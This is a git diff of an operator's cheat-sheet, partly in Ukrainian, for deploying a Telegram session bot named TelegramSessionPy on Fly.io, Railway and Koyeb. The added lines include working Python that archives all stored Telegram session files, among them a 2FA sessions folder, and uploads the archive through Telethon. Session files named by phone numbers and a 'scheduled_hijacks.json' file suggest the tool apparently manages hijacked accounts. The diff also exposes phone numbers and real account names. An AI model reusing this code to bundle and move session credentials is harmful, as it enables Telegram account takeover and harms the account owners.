@@ -212,7 +212,7 @@ flyctl volumes extend vol_re8l0odk2ej1xzor --size 5
 | Хочу скачати сесію | `flyctl sftp get /app/data/sessions/файл.session sessions/файл.session` |
 | Хочу залити сесію | `flyctl sftp shell` → `put локальний/шлях /app/data/sessions/файл.session` |
 
-flyctl sftp put C:\Practice\TelegramSessionPy\sessions\my_account.session /app/data/sessions/my_account.session
+railway sftp put C:\Practice\TelegramSessionPy\sessions\my_account.session /app/data/sessions/my_account.session
 
 rm /app/data/sessions/380959314572.session
 flyctl sftp put C:\Practice\TelegramSessionPy\scheduled_hijacks.json /app/data/scheduled_hijacks.json
@@ -242,21 +242,21 @@ koyeb instances list
 # Скопіюй файл (приклад — скачати scheduled_hijacks.json)
 koyeb instances exec b1f7fec5 -- cat /app/data/sessions/380959314572.session > sessions/380959314572.session
 
-4. Перезапуск / оновлення бота
-Перезапустити сервіс
-bashkoyeb services redeploy MY_APP/MY_SERVICE
-Оновити Docker образ і перезапустити
-bash# 1. Збери новий образ
-docker build -t YOUR_DOCKERHUB/telegram-bot:latest .
+# 1. Збери новий образ
+docker build -t mokut0n/telegram-bot:latest .
 
 # 2. Запуш на Docker Hub
-docker push YOUR_DOCKERHUB/telegram-bot:latest
+docker push mokut0n/telegram-bot:latest
 
 # 3. Передеплой на Koyeb
+koyeb services update spotless-katharina/telegram-bot --deployment-strategy immediate
+
+koyeb services pause spotless-katharina/telegram-bot
+koyeb services resume spotless-katharina/telegram-bot
 koyeb services redeploy spotless-katharina/telegram-bot
 
-
 koyeb services exec spotless-katharina/telegram-bot -- tar -czf /tmp/backup.tar.gz /app/data
+mv 380680250311.session my_account.session
 
 koyeb services exec spotless-katharina/telegram-bot -- python3 -c "
 import asyncio, os
@@ -272,4 +272,57 @@ asyncio.run(send())
 "
 
 
+tar -czf /tmp/backup.tar.gz /app/data
+
+tar -czf /tmp/all_sessions.tar.gz /app/data/sessions/ /app/data/sessions_2fa/
+
+
+python3 << 'EOF'
+import asyncio, os
+from telethon import TelegramClient
+
+async def send():
+    client = TelegramClient('/app/data/sessions/my_account', int(os.environ['API_ID']), os.environ['API_HASH'])
+    await client.start()
+    await client.send_file('me', '/tmp/backup.tar.gz', caption='Backup of chats')
+    await client.disconnect()
+    print('✅ Backup sent!')
+
+asyncio.run(send())
+EOF
+
+
+python3 << 'EOF'
+import asyncio
+import os
+import tarfile
+
+async def send_sessions():
+    # Створюємо архів
+    backup_path = '/tmp/all_sessions.tar.gz'
+    
+    with tarfile.open(backup_path, 'w:gz') as tar:
+        tar.add('/app/data/sessions', arcname='sessions')
+        tar.add('/app/data/sessions_2fa', arcname='sessions_2fa')
+    
+    print(f'✅ Архів створено: {backup_path}')
+    print(f'📦 Розмір: {os.path.getsize(backup_path) / 1024 / 1024:.2f} MB')
+    
+    # Надсилаємо через Telethon
+    from telethon import TelegramClient
+    
+    client = TelegramClient(
+        '/app/data/sessions/my_account',
+        int(os.environ['API_ID']),
+        os.environ['API_HASH']
+    )
+    
+    await client.start()
+    await client.send_file('me', backup_path, caption='📁 Backup of sessions and sessions_2fa folders')
+    await client.disconnect()
+    
+    print('✅ Архів надіслано в Saved Messages!')
+
+asyncio.run(send_sessions())
+EOF
 
